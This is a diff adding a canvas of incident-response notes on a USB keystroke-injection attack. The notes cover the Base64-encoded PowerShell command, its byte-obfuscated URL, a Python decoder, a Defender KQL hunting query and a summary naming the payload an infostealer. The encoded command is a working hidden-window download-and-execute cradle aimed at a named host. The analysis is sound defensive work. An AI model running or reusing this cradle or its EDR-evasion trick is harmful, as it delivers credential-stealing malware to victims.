@@ -1,0 +1,17 @@
+{
+	"nodes":[
+		{"id":"f8e4fed7bba86e6b","type":"text","text":"## Command (Base64 Encoded)\n\nThe PowerShell command which was executed on the endpoint is Base64 encoded to avoid accidental execution.\n\n```powershell\ncG93ZXJzaGVsbCAtdyBoIC1jICIkbT0oQCgxMDQsMTE2LDExNiwxMTIsMTE1LDU4LDQ3LDQ3LDEwMCw5NywxMTAsNDUsOTgsOTcsMTEwLDQ2LDk4LDEyMiw0NywxMjAsMTAwLDEwMSwxMTQsNDYsMTEyLDExNSw0OSl8JXtbY2hhcl0kX30pLWpvaW4nJzskeT1OZXctT2JqZWN0IE5ldC5XZWJDbGllbnQ7JHU9JHkuKCdEb3dubG9hZFN0cmknKyduZycpKCRtKTskaz0naScrJ2UnKyd4JzsmJGsgJHUiXDE=\n```","x":0,"y":-240,"width":600,"height":210},
+		{"id":"748865d87bfe2949","type":"text","text":"## Bytes\n\nThe PowerShell command uses bytes to obfuscate the command to bypass detection from EDR systems.\n\n```powershell\n104,116,116,112,115,58,47,47,100,97,110,45,98,97,110,46,98,122,47,120,100,101,114,46,112,115,49\n```","x":0,"y":20,"width":600,"height":210},
+		{"id":"d41533740e3a79e6","type":"text","text":"## Byte to Char \n\nThe bytes can be converted into ASCII characters using the following Python script. \n\n```python\ndef main():\n    data = [104,116,116,112,115,58,47,47,100,97,110,45,98,97,110,46,98,122,47,120,100,101,114,46,112,115,49]\n    \n\tfor i in data:\n\t\tprint(chr(i), end=\"\")\n\nif __name__ == \"__main__\":\n\tmain()\n```\n\n```powershell title=\"Terminal\"\nhttps://dan-ban.bz/xder.ps1\n```","x":0,"y":280,"width":600,"height":380},
+		{"id":"e165d915daa1482f","type":"text","text":"## KQLS\n\nThe PowerShell command uses `powershell` and `-c` parameter and we can investigate if any other systems has executed these commands recently through Advanced Hunting in Microsoft Defender XDR.\n\n```sql\nDeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMRU\"\n| where RegistryValueData contains \"powershell\"\n| where RegistryValueData contains \"-c\"\n| limit 100\n```","x":0,"y":710,"width":600,"height":320},
+		{"id":"35f950b54ba213f6","type":"text","text":"## Summary\n\n**What really happened in this security incident?** The user injected a USB which used the key strokes `Win + R` and a console was opened which tried to download a file from `https://dan-ban.bz/xder.ps1`. However, the website was down during my investigation and according to multiple of resources the `xder.ps1` is a infostealer.","x":0,"y":1080,"width":600,"height":190},
+		{"id":"1d443c4301c14d21","type":"text","text":"## Security Incident","x":0,"y":-340,"width":600,"height":60}
+	],
+	"edges":[
+		{"id":"30f2fa504d0c09d9","fromNode":"1d443c4301c14d21","fromSide":"bottom","toNode":"f8e4fed7bba86e6b","toSide":"top"},
+		{"id":"2be19f690fd94192","fromNode":"f8e4fed7bba86e6b","fromSide":"bottom","toNode":"748865d87bfe2949","toSide":"top"},
+		{"id":"82864abf8cee62ce","fromNode":"748865d87bfe2949","fromSide":"bottom","toNode":"d41533740e3a79e6","toSide":"top"},
+		{"id":"6f622acb20da5c5e","fromNode":"d41533740e3a79e6","fromSide":"bottom","toNode":"e165d915daa1482f","toSide":"top"},
+		{"id":"4f6a0c422a387051","fromNode":"e165d915daa1482f","fromSide":"bottom","toNode":"35f950b54ba213f6","toSide":"top"}
+	]
+}
